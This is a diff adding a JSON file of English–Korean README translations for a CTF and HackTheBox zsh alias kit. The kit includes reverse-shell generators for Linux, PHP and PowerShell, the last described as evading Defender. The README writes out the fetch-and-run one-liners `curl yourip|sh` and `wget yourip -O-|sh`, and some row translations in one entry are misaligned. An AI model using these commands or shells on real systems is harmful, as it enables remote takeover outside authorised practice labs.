@@ -1,0 +1,2251 @@
+[
+  {
+    "Id": 1,
+    "Content": "# Stuff for CTFs, HTB, THM etc\nContains aliases and scripts I often use. Just clone this repo **in your home folder** and run `echo \"source ~/zsh-aliases/aliases.zsh\" >> ~/.zshrc`. After restarting zsh you should be able to use all aliases and scripts. Only tested on Kali Linux, you might need to install additional dependencies on other distros. \n> #### Disclaimer\n> Most of those aliases probably suck, feel free to submit a pull request reducing the pepeganess. For me the fact that it works is enough to use them for now :D\n## Misc\n### > www\n\nStarts a HTTP server on port 80 in the current directory. Also prints a list of the IP address associated with each NIC, shows the current directory path and lists the files. \nExample: ",
+    "ContentSha": "PDcVaqiDFWArn9U0su/JA2ovxVLYxwcb/DzsFAaZALc=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "# CTF, HTB, THM 등을 위한 도구  \n자주 사용하는 별칭과 스크립트를 포함합니다. 이 저장소를 **홈 폴더에** 클론한 후 `echo \"source ~/zsh-aliases/aliases.zsh\" >> ~/.zshrc`를 실행하세요. zsh를 재시작하면 모든 별칭과 스크립트를 사용할 수 있습니다. 칼리 리눅스에서만 테스트했으며, 다른 배포판에서는 추가 종속성 설치가 필요할 수 있습니다.  \n> #### 면책 조항  \n> 대부분의 별칭은 아마도 형편없을 수 있으니, pepeganess를 줄이는 풀 리퀘스트 제출을 환영합니다. 저에게는 작동하는 것만으로도 충분합니다 :D  \n## 기타  \n### > www  \n\n현재 디렉토리에서 포트 80으로 HTTP 서버를 시작합니다. 또한 각 네트워크 인터페이스 카드에 연결된 IP 주소 목록을 출력하고, 현재 디렉토리 경로를 보여주며 파일 목록을 나열합니다.  \n예시:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "p+sWgdjfK1miGwl24mDhDjbR3h7KXBYonWGxK4W7vCs=",
+        "originContent": "# Stuff for CTFs, HTB, THM etc",
+        "translatedContent": "# CTF, HTB, THM 등을 위한 도구  "
+      },
+      {
+        "row": 2,
+        "rowsha": "YY6L24ef/eaq/BCK6ExdWizZUx6H0GU0q2ByWC5i38Y=",
+        "originContent": "Contains aliases and scripts I often use. Just clone this repo **in your home folder** and run `echo \"source ~/zsh-aliases/aliases.zsh\" >> ~/.zshrc`. After restarting zsh you should be able to use all aliases and scripts. Only tested on Kali Linux, you might need to install additional dependencies on other distros. ",
+        "translatedContent": "자주 사용하는 별칭과 스크립트를 포함합니다. 이 저장소를 **홈 폴더에** 클론한 후 `echo \"source ~/zsh-aliases/aliases.zsh\" >> ~/.zshrc`를 실행하세요. zsh를 재시작하면 모든 별칭과 스크립트를 사용할 수 있습니다. 칼리 리눅스에서만 테스트했으며, 다른 배포판에서는 추가 종속성 설치가 필요할 수 있습니다.  "
+      },
+      {
+        "row": 3,
+        "rowsha": "dpm+07m58gWR65dPEpz8PFKC313zXWfm4vFPv8FiGDI=",
+        "originContent": "> #### Disclaimer",
+        "translatedContent": "> #### 면책 조항  "
+      },
+      {
+        "row": 4,
+        "rowsha": "LegO6JHuf4mHZUD5wnaIJbB2ae24F6q76GmvKQFBnDA=",
+        "originContent": "> Most of those aliases probably suck, feel free to submit a pull request reducing the pepeganess. For me the fact that it works is enough to use them for now :D",
+        "translatedContent": "> 대부분의 별칭은 아마도 형편없을 수 있으니, pepeganess를 줄이는 풀 리퀘스트 제출을 환영합니다. 저에게는 작동하는 것만으로도 충분합니다 :D  "
+      },
+      {
+        "row": 5,
+        "rowsha": "IDl7IVTeldq+zk09MQBtmdLtaugodLNVSOpRc2CwBAI=",
+        "originContent": "## Misc",
+        "translatedContent": "## 기타  "
+      },
+      {
+        "row": 6,
+        "rowsha": "Ajdzeorvh0QCF9lW26/WRrlriIkF/dFza6zQdd4XxQI=",
+        "originContent": "### > www",
+        "translatedContent": "### > www  "
+      },
+      {
+        "row": 7,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 8,
+        "rowsha": "d8Y9lGBt5X3HW6bt4CQc/kwRbABEbefpJ/m3WcArNhs=",
+        "originContent": "Starts a HTTP server on port 80 in the current directory. Also prints a list of the IP address associated with each NIC, shows the current directory path and lists the files. ",
+        "translatedContent": "현재 디렉토리에서 포트 80으로 HTTP 서버를 시작합니다. 또한 각 네트워크 인터페이스 카드에 연결된 IP 주소 목록을 출력하고, 현재 디렉토리 경로를 보여주며 파일 목록을 나열합니다.  "
+      },
+      {
+        "row": 9,
+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": "예시:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 2,
+    "Content": "```\n┌──(jazz㉿kali)-[/tmp/www]\n└─$ www\n[eth0] 192.168.172.128\n[/tmp/www]\nlinpeas.sh  pspy64\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```",
+    "ContentSha": "aNQNgxE2DBU4gkNwl8chcz+Asy52PY/PsfMm8Lm8Z6g=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[/tmp/www]\n└─$ www\n[eth0] 192.168.172.128\n[/tmp/www]\nlinpeas.sh  pspy64\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "OSGTEUlgm6mvczT3eq0nWq2+0YhTIoJOsMGD+2bV9WU=",
+        "originContent": "┌──(jazz㉿kali)-[/tmp/www]",
+        "translatedContent": "┌──(jazz㉿kali)-[/tmp/www]"
+      },
+      {
+        "row": 3,
+        "rowsha": "l7ecQ7iBL00jFzq8S4GB3uW5HEmBf5Er/Zv3mnZycVo=",
+        "originContent": "└─$ www",
+        "translatedContent": "└─$ www"
+      },
+      {
+        "row": 4,
+        "rowsha": "gomYoufck9bZq9fAiu8+or4bjzwcBSPeCfoUiZS4KY0=",
+        "originContent": "[eth0] 192.168.172.128",
+        "translatedContent": "[eth0] 192.168.172.128"
+      },
+      {
+        "row": 5,
+        "rowsha": "6I7Z5f8s6/ymsOB7/X/jKt7tSu3ItjOE15oN92iOkE8=",
+        "originContent": "[/tmp/www]",
+        "translatedContent": "[/tmp/www]"
+      },
+      {
+        "row": 6,
+        "rowsha": "d6EHUGoatn3m7WWaAosLp1sdUZwhvsKH0ZfPm6KEG1o=",
+        "originContent": "linpeas.sh  pspy64",
+        "translatedContent": "linpeas.sh  pspy64"
+      },
+      {
+        "row": 7,
+        "rowsha": "vn2IxSCs+nYEEiHYr+KdtFi11fqSRGTyGJReFZdZSiM=",
+        "originContent": "Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...",
+        "translatedContent": "Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..."
+      },
+      {
+        "row": 8,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 3,
+    "Content": "> #### Notes\n> - Sudo is used to ensure being able to listen on port 80\n\n### > tun0\n\nCopies the IP addres of the tun0 interface to the clipboard. \nExample: ",
+    "ContentSha": "fqU+tME/9ZAz5uWolnlXCLjtEiCyl6wdTnHxHXUPSfo=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "> #### 노트\n> - 포트 80에서 수신할 수 있도록 sudo를 사용합니다.\n\n### > tun0\n\ntun0 인터페이스의 IP 주소를 클립보드에 복사합니다.\n예시:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 노트"
+      },
+      {
+        "row": 2,
+        "rowsha": "L44C2Kw4koewMHBcbEY6BSygqBIC85JNISTcS7BW3qc=",
+        "originContent": "> - Sudo is used to ensure being able to listen on port 80",
+        "translatedContent": "> - 포트 80에서 수신할 수 있도록 sudo를 사용합니다."
+      },
+      {
+        "row": 3,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 4,
+        "rowsha": "DjmCWn8PtMPwz0Y3mpigPTU868/Hx+lklGH+w5vh9Y4=",
+        "originContent": "### > tun0",
+        "translatedContent": "### > tun0"
+      },
+      {
+        "row": 5,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 6,
+        "rowsha": "SA6kQYAtUJ3qkd4g8OeEJvtuVIotn4AJSgpbl4EqSCc=",
+        "originContent": "Copies the IP addres of the tun0 interface to the clipboard. ",
+        "translatedContent": "tun0 인터페이스의 IP 주소를 클립보드에 복사합니다."
+      },
+      {
+        "row": 7,
+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": "예시:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 4,
+    "Content": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ tun0 \n```",
+    "ContentSha": "zN5YKj9hefUlVDpQH2uMKlVuizU8qWMajbz2qEDjkmg=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ tun0 \n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+        "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+        "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+      },
+      {
+        "row": 3,
+        "rowsha": "a1Y9SOQhHdzAMqVa3DfmJ4JNSyuxqcdIEWhHnYZKnmw=",
+        "originContent": "└─$ tun0 ",
+        "translatedContent": "└─$ tun0 "
+      },
+      {
+        "row": 4,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 5,
+    "Content": "Clipboard contents after:",
+    "ContentSha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "클립보드 내용 이후:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+        "originContent": "Clipboard contents after:",
+        "translatedContent": "클립보드 내용 이후:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 6,
+    "Content": "```\n10.10.14.41\n```",
+    "ContentSha": "8nZNm6U3CEEoW9M9oG1ghjSlqLp6SN3PEqPk71uthhc=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n10.10.14.41\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "Ay3w23NBoYQ6AzviIPPtVMw69B/sihQrN9d3QMr3hc8=",
+        "originContent": "10.10.14.41",
+        "translatedContent": "10.10.14.41"
+      },
+      {
+        "row": 3,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 7,
+    "Content": "\n### > mkdir_cd\nOften when making a directory I want to directly `cd` into it after. This does exactly that.  \nExample: ",
+    "ContentSha": "BN/2dhHHKRh2Gl8RauuzcsOUJ65ikIffKFFT0/8C7zQ=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "\n### > mkdir_cd\n디렉토리를 생성한 후 바로 그 디렉토리로 `cd` 하고 싶을 때가 많습니다. 이것은 정확히 그 작업을 수행합니다.  \n예시: ",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 2,
+        "rowsha": "qAEb1I85uZoXGRaSDD0i5Lk5fCrG5qUB1wM9SkCMAMQ=",
+        "originContent": "### > mkdir_cd",
+        "translatedContent": "### > mkdir_cd"
+      },
+      {
+        "row": 3,
+        "rowsha": "8CemvUjYkdq4ODVky9g/UvNXR8lj+VKKLeAzRl11MIM=",
+        "originContent": "Often when making a directory I want to directly `cd` into it after. This does exactly that.  ",
+        "translatedContent": "디렉토리를 생성한 후 바로 그 디렉토리로 `cd` 하고 싶을 때가 많습니다. 이것은 정확히 그 작업을 수행합니다.  "
+      },
+      {
+        "row": 4,
+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": "예시: "
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 8,
+    "Content": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ mkdir_cd pepega\n\n┌──(jazz㉿kali)-[~/jazz/pepega]\n└─$ \n```",
+    "ContentSha": "nYxbTm3NBww9GEeOd9nb1Wc5jPREAeiFJ2Y4XT0T11s=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ mkdir_cd pepega\n\n┌──(jazz㉿kali)-[~/jazz/pepega]\n└─$ \n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+        "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+        "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+      },
+      {
+        "row": 3,
+        "rowsha": "sMDYLvZ0h3YEhS1vwpj5KWM/nKyod33FTNeGwB/GaTI=",
+        "originContent": "└─$ mkdir_cd pepega",
+        "translatedContent": "└─$ mkdir_cd pepega"
+      },
+      {
+        "row": 4,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 5,
+        "rowsha": "Fd9OMLq53AAOZZxwQZqtJqMMKB40pgSfVQfjo1XECQ4=",
+        "originContent": "┌──(jazz㉿kali)-[~/jazz/pepega]",
+        "translatedContent": "┌──(jazz㉿kali)-[~/jazz/pepega]"
+      },
+      {
+        "row": 6,
+        "rowsha": "F+6YnjTNo87QSn0gITfCLF9XwCbciGaaCSzPlrzCpy0=",
+        "originContent": "└─$ ",
+        "translatedContent": "└─$ "
+      },
+      {
+        "row": 7,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 9,
+    "Content": "\n## Reverse shells\n### > gen_lin_rev $ip $port \nBased on [RSaaS](https://github.com/lukechilds/reverse-shell). Creates a file called `index.html` in the current directory. This file contains multiple reverse shell payloads that will be attempted in sequence until one works. Can be used with `www` to make spawning a reverse shell after gaining RCE extremely easy and fast. Just make the target execute `curl yourip|sh` and it will retrieve the reverse shell payload from your webserver and -hopefully- connect back to your listener. \nExample: ",
+    "ContentSha": "E8B+q1FjPwZGsrWPoHbntkMozarnFy0lhYiW/fC9SME=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "\n## 리버스 셸\n### > gen_lin_rev $ip $port \n[RSaaS](https://github.com/lukechilds/reverse-shell)를 기반으로 합니다. 현재 디렉터리에 `index.html` 파일을 생성합니다. 이 파일에는 여러 리버스 셸 페이로드가 포함되어 있으며, 하나가 작동할 때까지 순차적으로 시도됩니다. RCE를 얻은 후 리버스 셸을 쉽게 빠르게 실행하기 위해 `www`와 함께 사용할 수 있습니다. 대상이 `curl yourip|sh`를 실행하면 웹서버에서 리버스 셸 페이로드를 가져와 리스너에 연결을 시도합니다. \n예시: ",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 2,
+        "rowsha": "Bjbe9nx7QrTtAlRUklfdfO4fqHgButTkHK/DwW8E3sQ=",
+        "originContent": "## Reverse shells",
+        "translatedContent": "## 리버스 셸"
+      },
+      {
+        "row": 3,
+        "rowsha": "lM4EmGylzx+tXrec9iRwtgsPNHWfGyGkaJX5o9Qod0A=",
+        "originContent": "### > gen_lin_rev $ip $port ",
+        "translatedContent": "### > gen_lin_rev $ip $port "
+      },
+      {
+        "row": 4,
+        "rowsha": "FGkMQ6Fg2FUYvJfZlcpitRBl1/UBr4WsELoaq60ABgQ=",
+        "originContent": "Based on [RSaaS](https://github.com/lukechilds/reverse-shell). Creates a file called `index.html` in the current directory. This file contains multiple reverse shell payloads that will be attempted in sequence until one works. Can be used with `www` to make spawning a reverse shell after gaining RCE extremely easy and fast. Just make the target execute `curl yourip|sh` and it will retrieve the reverse shell payload from your webserver and -hopefully- connect back to your listener. ",
+        "translatedContent": "[RSaaS](https://github.com/lukechilds/reverse-shell)를 기반으로 합니다. 현재 디렉터리에 `index.html` 파일을 생성합니다. 이 파일에는 여러 리버스 셸 페이로드가 포함되어 있으며, 하나가 작동할 때까지 순차적으로 시도됩니다. RCE를 얻은 후 리버스 셸을 쉽게 빠르게 실행하기 위해 `www`와 함께 사용할 수 있습니다. 대상이 `curl yourip|sh`를 실행하면 웹서버에서 리버스 셸 페이로드를 가져와 리스너에 연결을 시도합니다. "
+      },
+      {
+        "row": 5,
+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": "예시: "
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 10,
+    "Content": "```\n┌──(jazz㉿kali)-[~]\n└─$ gen_lin_rev 127.0.0.1 1337\n[+] Wrote Linux reverse shells to /home/jazz/index.html\n```",
+    "ContentSha": "bRl+BcyZ8Bhi5t/DnPliwbfJP6fLxTI6Brc9CYNQtsM=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~]\n└─$ gen_lin_rev 127.0.0.1 1337\n[+] Wrote Linux reverse shells to /home/jazz/index.html\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "ty/x6ZluZLABP4RO1uWEAPF20EpOg76E7Cx+tFfpg/c=",
+        "originContent": "┌──(jazz㉿kali)-[~]",
+        "translatedContent": "┌──(jazz㉿kali)-[~]"
+      },
+      {
+        "row": 3,
+        "rowsha": "AhRA+47Cm/K93CTCiRvetHS1C1SiQWb8jqZZ24stwZ4=",
+        "originContent": "└─$ gen_lin_rev 127.0.0.1 1337",
+        "translatedContent": "└─$ gen_lin_rev 127.0.0.1 1337"
+      },
+      {
+        "row": 4,
+        "rowsha": "PnXRb/QSlXVKBEbLk0TdupdiH8Eeae1ThB8EaVyKTxY=",
+        "originContent": "[+] Wrote Linux reverse shells to /home/jazz/index.html",
+        "translatedContent": "[+] Wrote Linux reverse shells to /home/jazz/index.html"
+      },
+      {
+        "row": 5,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 11,
+    "Content": "> #### Notes\n> - I really like how the `curl yourip|sh` payload doesn't really have any badchars besides possibly the space and the pipe. When spaces form an issue there are [ways around this](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces) and the pipe can be bypassed by just downloading and executing separately.\n> - If curl is not installed on the remote machine you can try `wget yourip -O-|sh`\n \n\n### > gen_php_rev $ip $port\n\nGenerates the [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) with the supplied ip and port and saves it in the current directory.  \nExample: ",
+    "ContentSha": "9wyDXzWeeLFa+e9jGIEoSJ/tUzrZW8If22elN/SbHiE=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "> #### 노트\n> - `curl yourip|sh` 페이로드가 공백과 파이프를 제외하고는 별다른 나쁜 문자가 없다는 점이 정말 마음에 듭니다. 공백이 문제될 경우 이를 우회하는 [방법들](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces)이 있고, 파이프는 별도로 다운로드 후 실행하여 우회할 수 있습니다.\n> - 원격 머신에 curl이 설치되어 있지 않으면 `wget yourip -O-|sh`를 시도해 볼 수 있습니다.\n \n### > gen_php_rev $ip $port\n\n주어진 ip와 포트로 [PentestMonkey PHP 역방향 쉘](https://github.com/pentestmonkey/php-reverse-shell)을 생성하여 현재 디렉토리에 저장합니다.  \n예시:\n",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 노트"
+      },
+      {
+        "row": 2,
+        "rowsha": "oUBk4FfNI0iMsvKWCtVZHl1VEYf9yBVNPxERVeBupp8=",
+        "originContent": "> - I really like how the `curl yourip|sh` payload doesn't really have any badchars besides possibly the space and the pipe. When spaces form an issue there are [ways around this](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces) and the pipe can be bypassed by just downloading and executing separately.",
+        "translatedContent": "> - `curl yourip|sh` 페이로드가 공백과 파이프를 제외하고는 별다른 나쁜 문자가 없다는 점이 정말 마음에 듭니다. 공백이 문제될 경우 이를 우회하는 [방법들](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces)이 있고, 파이프는 별도로 다운로드 후 실행하여 우회할 수 있습니다."
+      },
+      {
+        "row": 3,
+        "rowsha": "QlERH1P3Jj9dWUQgwwiOf5+90DBryWaRbBXaUAGMCoA=",
+        "originContent": "> - If curl is not installed on the remote machine you can try `wget yourip -O-|sh`",
+        "translatedContent": "> - 원격 머신에 curl이 설치되어 있지 않으면 `wget yourip -O-|sh`를 시도해 볼 수 있습니다."
+      },
+      {
+        "row": 4,
+        "rowsha": "Nqnn8clbgv+5l0PgxcTOldg8mkMKrFn4TvPL+rYUUGg=",
+        "originContent": " ",
+        "translatedContent": " "
+      },
+      {
+        "row": 5,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### > gen_php_rev $ip $port"
+      },
+      {
+        "row": 6,
+        "rowsha": "KzCrb6A1L0A9+DaXEtZpvdALyw1LEg/EoXZ1KPZrQkA=",
+        "originContent": "### > gen_php_rev $ip $port",
+        "translatedContent": ""
+      },
+      {
+        "row": 7,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "주어진 ip와 포트로 [PentestMonkey PHP 역방향 쉘](https://github.com/pentestmonkey/php-reverse-shell)을 생성하여 현재 디렉토리에 저장합니다.  "
+      },
+      {
+        "row": 8,
+        "rowsha": "rl9TLwOsSGEolZie8y8KN1r95+OxG4QeO1tsfU7k1cE=",
+        "originContent": "Generates the [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) with the supplied ip and port and saves it in the current directory.  ",
+        "translatedContent": "예시:"
+      },
+      {
+        "row": 9,
+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": ""
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 12,
+    "Content": "```\n┌──(jazz㉿kali)-[~]\n└─$ gen_php_rev 127.0.0.1 1337                                                              \n[+] Wrote PHP reverse shell to /home/jazz/jazz.php\n```",
+    "ContentSha": "nZvaBRIMkHgue4tsKrtXahTW9vYyilPCm7yvYPzK8+U=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~]\n└─$ gen_php_rev 127.0.0.1 1337                                                              \n[+] Wrote PHP reverse shell to /home/jazz/jazz.php\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "ty/x6ZluZLABP4RO1uWEAPF20EpOg76E7Cx+tFfpg/c=",
+        "originContent": "┌──(jazz㉿kali)-[~]",
+        "translatedContent": "┌──(jazz㉿kali)-[~]"
+      },
+      {
+        "row": 3,
+        "rowsha": "TYepdWhFeGKmMhm2iA6byylI287GMnxSBPW5Y97ECkU=",
+        "originContent": "└─$ gen_php_rev 127.0.0.1 1337                                                              ",
+        "translatedContent": "└─$ gen_php_rev 127.0.0.1 1337                                                              "
+      },
+      {
+        "row": 4,
+        "rowsha": "8UDkLxYNyuuxKddLRhI6CxizXos/7krY8209Nvr+W9Q=",
+        "originContent": "[+] Wrote PHP reverse shell to /home/jazz/jazz.php",
+        "translatedContent": "[+] Wrote PHP reverse shell to /home/jazz/jazz.php"
+      },
+      {
+        "row": 5,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 13,
+    "Content": "### > gen_ps_rev $ip $port\nGenerates a Powershell reverse shell with the supplied ip and port which at the moment of last usage bypassed defender. I'm not sure who to give credit for this payload. \nExample:",
+    "ContentSha": "Pw++WnugOMybnJMpQoa84BihtTmVObwI/Vu8pz2P52U=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "### > gen_ps_rev $ip $port\n제공된 IP와 포트를 사용하여 Powershell 리버스 셸을 생성하며, 마지막 사용 시점에 디펜더를 우회했습니다. 이 페이로드의 출처는 확실하지 않습니다.  \n예시:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "7IFmQQMXQrXc2mQtCyOdOR2SDGtIJb4weteu66X6MdI=",
+        "originContent": "### > gen_ps_rev $ip $port",
+        "translatedContent": "### > gen_ps_rev $ip $port"
+      },
+      {
+        "row": 2,
+        "rowsha": "dPeMQIfdXe18lMipL7AUIp+pj2UtpjxGataNA/gfivo=",
+        "originContent": "Generates a Powershell reverse shell with the supplied ip and port which at the moment of last usage bypassed defender. I'm not sure who to give credit for this payload. ",
+        "translatedContent": "제공된 IP와 포트를 사용하여 Powershell 리버스 셸을 생성하며, 마지막 사용 시점에 디펜더를 우회했습니다. 이 페이로드의 출처는 확실하지 않습니다.  "
+      },
+      {
+        "row": 3,
+        "rowsha": "hyiH5WPnWVf/wgsCEzJQTy3dCo85ZMuTBwhjv68Tza0=",
+        "originContent": "Example:",
+        "translatedContent": "예시:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 14,
+    "Content": "```\n┌──(jazz㉿kali)-[~]\n└─$ gen_ps_rev 127.0.0.1 1337\n```",
+    "ContentSha": "o8mMJhtmHOHISNONvnJSbu5UHQ6BuAUSUKY+DaMd0IM=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~]\n└─$ gen_ps_rev 127.0.0.1 1337\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "ty/x6ZluZLABP4RO1uWEAPF20EpOg76E7Cx+tFfpg/c=",
+        "originContent": "┌──(jazz㉿kali)-[~]",
